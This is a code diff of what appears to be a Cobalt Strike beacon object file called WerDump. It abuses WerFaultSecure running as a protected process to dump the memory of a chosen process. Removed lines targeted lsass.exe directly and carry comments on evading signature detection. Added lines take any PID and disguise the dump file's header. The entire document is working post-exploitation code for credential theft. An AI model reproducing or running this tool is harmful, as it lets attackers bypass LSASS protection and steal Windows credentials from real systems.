@@ -2,7 +2,7 @@
 #include "WerDump.h"
 
 // Handle pointer in decimal
-wchar_t* HandleToDecimal(HANDLE h) {
+char* HandleToDecimal(HANDLE h) {
   // Get Process Heap
   HANDLE hHeap = KERNEL32$GetProcessHeap();
   if (!hHeap) {
@@ -11,11 +11,11 @@ wchar_t* HandleToDecimal(HANDLE h) {
   }
 
   size_t bufferSize = 32; // Sufficient for a HANDLE (64bit) in decimal
-  wchar_t* buffer = (wchar_t*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize * sizeof(wchar_t));
+  char* buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize * sizeof(char));
   if (!buffer) {
       return NULL;
   }
-  MSVCRT$swprintf_s(buffer, bufferSize, L"%llu", (unsigned long long)h);
+  MSVCRT$sprintf_s(buffer, bufferSize, "%llu", (unsigned long long)h);
 
 end:
   KERNEL32$CloseHandle(hHeap);
@@ -23,7 +23,7 @@ end:
 }
 
 // Convert Wchar_t* to char* to output
-VOID PrintWchar(wchar_t* wchar_text) {
+VOID PrintAchar(char* text) {
   // Get Process Heap
   HANDLE hHeap = KERNEL32$GetProcessHeap();
   if (!hHeap) {
@@ -31,42 +31,8 @@ VOID PrintWchar(wchar_t* wchar_text) {
       return;
   }
 
-  /* Convert the wchar_t* to a char* for printing */
-  int multiByteSize = KERNEL32$WideCharToMultiByte(
-      CP_UTF8,
-      0,
-      wchar_text,
-      -1,
-      NULL,
-      0,
-      NULL,
-      NULL
-  );
-
-  if (multiByteSize > 0) {
-    char* multiByteCmd = (char*)KERNEL32$HeapAlloc(
-      hHeap,
-      HEAP_ZERO_MEMORY,
-      multiByteSize
-    );
-
-    if (multiByteCmd) {
-      KERNEL32$WideCharToMultiByte(
-        CP_UTF8,
-        0,
-        wchar_text,
-        -1,
-        multiByteCmd,
-        multiByteSize,
-        NULL,
-        NULL
-      );
-      // Now print the converted string
-      BeaconPrintf(CALLBACK_OUTPUT, "%s", multiByteCmd);
-      KERNEL32$HeapFree(hHeap, 0, multiByteCmd);
-    }
-  }
-end:
+  // Now print the converted string
+  BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
   KERNEL32$CloseHandle(hHeap);
 }
 
@@ -106,32 +72,6 @@ end:
   return bReturnValue;
 }
 
-// Get Lsass Process
-BOOL EnumProcess(char *pProcessName, DWORD *pdwProcessId) {
-  PROCESSENTRY32 pe32;
-  pe32.dwSize = sizeof(PROCESSENTRY32);
-
-  HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-  if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
-
-  if (!KERNEL32$Process32First(hSnapshot, &pe32)) {
-    KERNEL32$CloseHandle(hSnapshot);
-    return FALSE;
-  }
-
-  do {
-    if (stricmp(pe32.szExeFile, pProcessName) == 0) {
-      *pdwProcessId = pe32.th32ProcessID;
-      KERNEL32$CloseHandle(hSnapshot);
-      BeaconPrintf(CALLBACK_OUTPUT, "[+] Found lsass process PID: %u\n", *pdwProcessId);
-      return TRUE;
-    }
-  } while (KERNEL32$Process32Next(hSnapshot, &pe32));
-
-  return FALSE;
-}
-
 // Get PPL Status
 BOOL ProcessGetProtectionLevel(DWORD dwProcessId, PDWORD pdwProtectionLevel)
 {
@@ -158,46 +98,8 @@ end:
 	return bReturnValue;
 }
 
-// Write WerFaultSecure to disk
-// This is a the default approach, while it leaves an IOC, and potentially can get you detected,
-// there are other ways you can use to run the PE in memory, however it wouldn't be effective as it requires it to be in disk anyways for signature verification and thus effecting the protection status.
-// so its a risk you're willing to take.
-// you can however manipulate the binary itself, to avoid signature detection, and try to make it legit as possible.
-// there's much better approaches that what i wrote in WriteWer, this is only a poc, imagine modify it and explorrre.
-BOOL WriteWer(BYTE Bin[], INT size, wchar_t*  werPath) {
-  wchar_t path[MAX_PATH];
-  if (KERNEL32$GetTempPathW(MAX_PATH, path) == 0) {
-    BeaconPrintf(CALLBACK_ERROR, "[+] GetTempPAthA failed to get temp path: Error [%d]\n", KERNEL32$GetLastError());
-    return FALSE;
-  }
-  MSVCRT$srand((unsigned int)MSVCRT$time(NULL)); // Seed the random number generator
-  wchar_t filename[MAX_PATH];
-  MSVCRT$swprintf_s(filename, MAX_PATH, L"%s\%08X.exe", path, MSVCRT$rand());
-
-  BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing executable to file: ");
-  PrintWchar(filename);
-  BeaconPrintf(CALLBACK_OUTPUT, "\n");
-
-  /* CreateFileW */
-  HANDLE hFile = KERNEL32$CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-  if (hFile == INVALID_HANDLE_VALUE) {
-    BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileW failed: %d\n", KERNEL32$GetLastError());
-    return FALSE;
-  }
-
-  // Write the data to the file
-  DWORD bytesWritten;
-  BOOL result = KERNEL32$WriteFile(hFile, Bin, size - 1, &bytesWritten, NULL);
-  BeaconPrintf(CALLBACK_OUTPUT, "[+] Sucessfully Wrote to file");
-  MSVCRT$wcscpy_s( werPath, MAX_PATH, filename);
-
-end:
-  KERNEL32$CloseHandle(hFile);
-  return result && (bytesWritten == size - 1); // return TRUE
-}
-
 // Create Process as PPL
-BOOL CreatePLLProcess(DWORD Plevel, wchar_t* Path) {
+BOOL CreatePPLProcess(DWORD Plevel, char* Path) {
   SIZE_T size = 0;
 
   STARTUPINFOEXW siex = { 0 };
@@ -243,8 +145,8 @@ BOOL CreatePLLProcess(DWORD Plevel, wchar_t* Path) {
   siex.lpAttributeList = lpAttributeList;
 
   // Create Process
-  if (!KERNEL32$CreateProcessW(NULL, (LPWSTR)Path, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS, NULL, NULL, &siex.StartupInfo, &pi)) {
-    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to CreateProcessW: Error [%d]\n", KERNEL32$GetLastError());
+  if (!KERNEL32$CreateProcessA(NULL, Path, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS, NULL, NULL, &siex.StartupInfo, &pi)) {
+    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to CreateProcessA: Error [%d]\n", KERNEL32$GetLastError());
     KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
     KERNEL32$HeapFree(hHeap, 0, lpAttributeList);
     return FALSE;
@@ -268,10 +170,10 @@ BOOL CreatePLLProcess(DWORD Plevel, wchar_t* Path) {
   Result = KERNEL32$WaitForSingleObject(hProcess, INFINITE);
   if (Result == WAIT_OBJECT_0) {
     KERNEL32$GetExitCodeProcess(hProcess, &Exitcode);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] PPL Process exit with code: [%d]\n", Exitcode);
+    //BeaconPrintf(CALLBACK_OUTPUT, "[+] PPL Process exit with code: [%d]\n", Exitcode);
   }
 
-  BeaconPrintf(CALLBACK_OUTPUT, "[+] Created Process Result code: [%d]\n", Result);
+  //BeaconPrintf(CALLBACK_OUTPUT, "[+] Created Process Result code: [%d]\n", Result);
   return TRUE;
 }
 
@@ -331,9 +233,9 @@ DWORD GetMainThreadId(DWORD pid) {
     }
 
     if (mainThreadId == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "Main thread not found for PID %u\n", pid);
+        BeaconPrintf(CALLBACK_ERROR, "[!] Main thread not found for PID %u\n", pid);
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "Main thread ID for PID %u: %u\n", pid, mainThreadId);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Main thread ID for PID %u: %u\n", pid, mainThreadId);
     }
 
     // Clean up
@@ -342,60 +244,50 @@ DWORD GetMainThreadId(DWORD pid) {
 }
 
 // Create Thread to independently run ResumeProcess
-/* BOOL ResumeProcessThread(DWORD dwProcessId) { */
-/*   /\* HANDLE threadId = KERNEL32$CreateThread(NULL, 0, ResumeProcess, hProcessId, DWORD dwCreationFlags, LPDWORD lpThreadId) *\/ */
-/*   DWORD dwThreadId; */
-/*   HANDLE hThreadId = KERNEL32$CreateThread(NULL, 0, ResumeProcess, &dwProcessId, 0, &dwThreadId); */
-/*   if (!hThreadId) { */
-/*     BeaconPrintf(CALLBACK_ERROR, "[!] CreateThread failed: %d\n", KERNEL32$GetLastError()); */
-/*     return FALSE; */
-/*   } */
-/*   KERNEL32$CloseHandle(hThreadId); */
-/*   return TRUE; */
-/* } */
+BOOL ResumeProcessThread(DWORD dwProcessId) {
+  HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, dwProcessId);
+  if (!hProcess) {
+    BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open process with PROCESS_SUSPEND_RESUME, retrying...\n");
+  }
+  //BeaconPrintf(CALLBACK_ERROR, "[+] Opened a handle to PID: %d\n", dwProcessId);
+  
+  NTSTATUS STATUS = NTDLL$NtResumeProcess(hProcess);
+  if (STATUS == 0x00) {
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully resumed process %d\n", dwProcessId);
+    KERNEL32$CloseHandle(hProcess);
+    return TRUE; // Success, exit the thread
+  }
 
-DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, wchar_t werPath[MAX_PATH]) {
+  BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resume process\n");
+  KERNEL32$CloseHandle(hProcess);
+
+  return FALSE;
+}
+
+DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, char werPath[MAX_PATH], char werDump[MAX_PATH], unsigned char werSig[MAX_PATH]) {
   DWORD dwProtectionLevel = 0;
-
-  /* if (!ProcessGetProtectionLevel(dwProcessId, &dwProtectionLevel)) { */
-  /*   BeaconPrintf(CALLBACK_ERROR, "[+] Something went wrong, when getting protection level\n"); */
-  /*   return; */
-  /* } */
-
-  /* BeaconPrintf(CALLBACK_OUTPUT, "[+] Protection Code: 0x%lx\n", dwProtectionLevel); */
 
   SECURITY_ATTRIBUTES sa = {};
   sa.nLength = sizeof(sa);
   sa.bInheritHandle = TRUE;
   sa.lpSecurityDescriptor = NULL;
 
-  // Generate a random filename
-  wchar_t path[MAX_PATH];
-  if (KERNEL32$GetTempPathW(MAX_PATH, path) == 0) {
-    BeaconPrintf(CALLBACK_ERROR, "[+] GetTempPAthA failed to get temp path: Error [%d]\n", KERNEL32$GetLastError());
-    return FALSE;
-  }
-  MSVCRT$srand((unsigned int)MSVCRT$time(NULL)); // Seed the random number generator
-  wchar_t werDump[MAX_PATH], werDumpEnc[MAX_PATH];
-  MSVCRT$swprintf_s(werDump, MAX_PATH, L"%s\%08X.dll", path, MSVCRT$rand());
-  MSVCRT$swprintf_s(werDumpEnc, MAX_PATH, L"%s\%08X.dll", path, MSVCRT$rand());
-
-  HANDLE hDump = KERNEL32$CreateFileW(werDump, GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-  HANDLE hEncDump = KERNEL32$CreateFileW(werDumpEnc, GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+  HANDLE hDump = KERNEL32$CreateFileA(werDump, GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+  HANDLE hEncDump = KERNEL32$CreateFileA("enc.dump", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   if (hDump == INVALID_HANDLE_VALUE || hEncDump == INVALID_HANDLE_VALUE)
   {
-    BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileW failed: %d\n", KERNEL32$GetLastError());
+    BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileA failed: %d\n", KERNEL32$GetLastError());
   }
 
-  HANDLE hCancel = KERNEL32$CreateEventW(&sa, TRUE, FALSE, NULL);
+  HANDLE hCancel = KERNEL32$CreateEventA(&sa, TRUE, FALSE, NULL);
   if (!hCancel)
   {
-    BeaconPrintf(CALLBACK_ERROR, "[!] CreateEventW failed: %d\n", KERNEL32$GetLastError());
+    BeaconPrintf(CALLBACK_ERROR, "[!] CreateEventA failed: %d\n", KERNEL32$GetLastError());
     KERNEL32$CloseHandle(hDump);
     KERNEL32$CloseHandle(hEncDump);
     return 1;
   }
-
+  
   size_t cmdSize = 1024; // Adjust based on expected length
   HANDLE hHeap = KERNEL32$GetProcessHeap();
   if (!hHeap) {
@@ -403,15 +295,15 @@ DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, wchar_t werPath[MAX_PATH]) 
     return 1;
   }
 
-  wchar_t* commandLine = (wchar_t*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cmdSize * sizeof(wchar_t));
+  char* commandLine = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cmdSize * sizeof(char));
   if (!commandLine) {
       return 1; // Handle allocation failure
   }
 
   // Convert handles to decimal strings
-  wchar_t* hDumpStr = HandleToDecimal(hDump);
-  wchar_t* hEncDumpStr = HandleToDecimal(hEncDump);
-  wchar_t* hCancelStr = HandleToDecimal(hCancel);
+  char* hDumpStr = HandleToDecimal(hDump);
+  char* hEncDumpStr = HandleToDecimal(hEncDump);
+  char* hCancelStr = HandleToDecimal(hCancel);
 
   if (!hDumpStr || !hEncDumpStr || !hCancelStr) {
       BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert to handle decimal\n");
@@ -419,11 +311,11 @@ DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, wchar_t werPath[MAX_PATH]) 
       return 1; // Handle allocation failure
   }
 
-  // Build the command line using swprintf
-  int result = MSVCRT$swprintf_s(
+  // Build the command line using sprintf
+  int result = MSVCRT$sprintf_s(
       commandLine,
       cmdSize,
-      L"\"%s\" /h /pid %d /tid %d /file %s /encfile %s /cancel %s /type 268310",
+      "\"%s\" /h /pid %d /tid %d /file %s /encfile %s /cancel %s /type 268310",
       werPath,
       dwProcessId,
       dwProcessTid,
@@ -432,34 +324,28 @@ DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, wchar_t werPath[MAX_PATH]) 
       hCancelStr
   );
   if (result < 0) {
-      BeaconPrintf(CALLBACK_ERROR, "[!] swprintf_s failed\n");
+      BeaconPrintf(CALLBACK_ERROR, "[!] sprintf_s failed\n");
       goto end;
   }
 
-  /* PrintWchar(commandLine); */
-  /* goto end; */
+  //PrintAchar(commandLine);
 
-  /* ResumeProcessThread(dwProcessId); */
-  BOOL status = CreatePLLProcess(dwProtectionLevel, commandLine);
+  BOOL status = CreatePPLProcess(dwProtectionLevel, commandLine);
   if (!status) {
     BeaconPrintf(CALLBACK_ERROR, "[!] Cannot Create PPL process :(\n");
     goto end;
   }
 
-  // {0x4D, 0x44, 0x4D, 0x50} // Mini dump header
-  BYTE data[4] = {0x4D, 0x5A, 0x90, 0x00}; // PE magic header
-  DWORD bytesW;
   KERNEL32$SetFilePointer(hDump, 0, NULL, FILE_BEGIN);
-
-  if (!KERNEL32$WriteFile(hDump, data, sizeof(data), &bytesW, NULL)) {
+  DWORD bytes;
+  if (!KERNEL32$WriteFile(hDump, werSig, 4, &bytes, NULL)) {
     BeaconPrintf(CALLBACK_ERROR, "[!] WriteFile failed: %d\n", KERNEL32$GetLastError());
     goto end;
   }
 
-  BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully Dumped Lsass, Find the dump in the following path");
-  PrintWchar(werDump);
-  BeaconPrintf(CALLBACK_OUTPUT, "\n");
+  BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully Dumped process %d, Find the dump in the following path %s \n", dwProcessId, werDump);
 
+  ResumeProcessThread(dwProcessId);
 
 end:
   // Clean up
@@ -470,46 +356,28 @@ end:
   KERNEL32$CloseHandle(hDump);
   KERNEL32$CloseHandle(hEncDump);
   KERNEL32$CloseHandle(hCancel);
-  /* KERNEL32$DeleteFileW(werDump); */
-  KERNEL32$DeleteFileW(werDumpEnc);
-  KERNEL32$DeleteFileW(werPath);
+  KERNEL32$DeleteFileA("enc.dump");
   return 0;
+  
 }
 
-
-#ifdef BOF
-
 void go(IN PCHAR args, IN ULONG argc) {
-  datap parser = {0};
-  BeaconDataParse(&parser, args ,argc);
-  // Extract Exe
-  INT binLength = 0;
-  unsigned char* ExeBin = BeaconDataExtract(&parser, &binLength);
-  /* BeaconPrintf(CALLBACK_OUTPUT, "[+] Binary Length WerFaultSecure executable %d\n", binLength); */
-  wchar_t werPath[MAX_PATH];
-  if (!WriteWer(ExeBin, binLength, werPath)) {
-    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to write WerFaultSecure executable\n");
-  }
-  /* DWORD dwProcessTid = GetMainThreadId(KERNEL32$GetProcessId(KERNEL32$GetCurrentProcess())); */
-  // Check first if we can enable the privilege.
+  datap parser;
+  BeaconDataParse(&parser, args, argc);
+  
+  unsigned char * werPath = BeaconDataExtract(&parser, NULL);
+  DWORD dwProcessId = BeaconDataInt(&parser);
+  unsigned char * werDump = BeaconDataExtract(&parser, NULL);
+  unsigned char * werSig = BeaconDataExtract(&parser, NULL);
+
   if (!EnableDebugPrivilege()) {
       BeaconPrintf(CALLBACK_ERROR, "[+] Failed to enable SeDebugPrivilege\n");
       return;
   }
-  DWORD dwProcessId;
-  if (!EnumProcess("lsass.exe", &dwProcessId)) return;
+
   DWORD dwProcessTid = GetMainThreadId(dwProcessId);
-  if (WerDump(dwProcessTid, dwProcessId, werPath) != 0) {
+  if (WerDump(dwProcessTid, dwProcessId, werPath, werDump, werSig) != 0) {
     BeaconPrintf(CALLBACK_ERROR, "[+] Failed to dump\n");
   }
   return;
 }
-
-#else
-
-int main() {
-  /* GetMainThreadId(KERNEL32$GetProcessId((HANDLE)(LONG_PTR) -1)); */
-  return 0;
-}
-
-#endif
